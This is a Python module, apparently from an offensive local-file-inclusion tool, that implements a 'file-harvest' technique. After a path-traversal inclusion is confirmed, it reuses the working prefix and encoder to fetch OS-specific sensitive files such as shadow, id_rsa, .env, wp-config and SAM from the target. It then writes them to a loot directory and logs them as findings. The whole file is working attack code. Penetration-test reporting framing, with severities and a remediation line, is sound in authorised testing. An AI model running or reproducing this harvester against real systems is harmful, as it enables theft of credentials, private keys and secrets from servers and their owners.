"""
Post-confirmation sensitive-file harvesting.

Once inclusion is confirmed, this technique reuses the working traversal prefix
and encoder to pull a curated set of high-value files (credentials, keys,
configs, logs) appropriate to the detected OS. It records what was recovered as
lower-severity informational findings so a report captures real impact without
re-running the whole discovery pipeline.
"""
from __future__ import annotations

import os as _os
from typing import Iterator, List, Optional

from lfimachine.core.http import Response
from lfimachine.core.result import Finding, Severity
from lfimachine.payloads import encoders as enc
from lfimachine.payloads import signatures, wordlists
from lfimachine.techniques.base import Technique, TechniqueContext
from lfimachine.techniques.log_poison import _traversal_prefix


class HarvestTechnique(Technique):
    name = "file-harvest"
    description = "Recover sensitive files through the confirmed inclusion"
    priority = 20
    requires_inclusion = True

    def __init__(self, loot_dir: Optional[str] = None, limit: int = 25) -> None:
        self.loot_dir = loot_dir
        self.limit = limit

    def applicable(self, ctx: TechniqueContext) -> bool:
        return ctx.confirmed_traversal is not None

    def _fetch(self, ctx: TechniqueContext, prefix: str, target: str) -> Optional[Response]:
        rel = target.lstrip("/")
        payload = f"{prefix}{rel}"
        _, encoded = enc.variants(payload, [ctx.confirmed_encoder], is_path=True)[0]
        resp = ctx.point.send(ctx.client, encoded)
        if resp.ok and resp.status_code == 200 and resp.length > 0:
            return resp
        return None

    def _looks_real(self, ctx: TechniqueContext, body: str) -> bool:
        # Reject empty/error bodies: require either a known signature or a
        # response that does not resemble the baseline error page.
        if not body.strip():
            return False
        if signatures.match_signatures(body):
            return True
        head = body[:200].lower()
        if any(k in head for k in ("not found", "no such file", "failed to open")):
            return False
        # Fall back to the baseline error fingerprint when available.
        if ctx.baseline and ctx.baseline.invalid_signature:
            return ctx.baseline.invalid_signature not in body
        return len(body) > 0

    def run(self, ctx: TechniqueContext) -> Iterator[Finding]:
        log = ctx.logger
        prefix = _traversal_prefix(ctx)
        if prefix is None:
            return
        os_name = ctx.os_confirmed or ctx.fingerprint.os or "linux"

        targets: List[str] = wordlists.flatten_sensitive(os_name)
        recovered = 0
        for target in targets:
            if recovered >= self.limit:
                break
            if "*" in target:  # skip glob placeholders in direct fetch
                continue
            resp = self._fetch(ctx, prefix, target)
            if resp is None:
                continue
            if not self._looks_real(ctx, resp.text):
                continue
            recovered += 1

            saved = self._save(target, resp.text)
            sev = self._severity_for(target)
            log.good(f"Recovered {target} ({resp.length} bytes)"
                     + (f" -> {saved}" if saved else ""))
            yield Finding(
                technique=self.name,
                title=f"Sensitive file recovered — {target}",
                severity=sev,
                confidence=0.75,
                url=resp.url or ctx.point.url,
                parameter=ctx.point.parameter or "<path>",
                method=ctx.point.method,
                payload=f"{prefix}{target.lstrip('/')}",
                encoder=ctx.confirmed_encoder,
                evidence=resp.text[:160].replace("\n", "\\n"),
                os_guess=os_name,
                status_code=resp.status_code,
                response_length=resp.length,
                remediation="Restrict filesystem access and remove secrets from disk paths reachable by the app.",
                extra={"saved_to": saved} if saved else {},
            )

    def _severity_for(self, target: str) -> Severity:
        t = target.lower()
        if any(k in t for k in ("shadow", "id_rsa", ".env", "wp-config",
                                "config.php", "web.config", "sam")):
            return Severity.HIGH
        return Severity.MEDIUM

    def _save(self, target: str, body: str) -> Optional[str]:
        if not self.loot_dir:
            return None
        try:
            _os.makedirs(self.loot_dir, exist_ok=True)
            safe = target.strip("/").replace("/", "_").replace(":", "").replace("\\", "_")
            path = _os.path.join(self.loot_dir, safe or "root")
            with open(path, "w", encoding="utf-8", errors="replace") as fh:
                fh.write(body)
            return path
        except OSError:
            return None
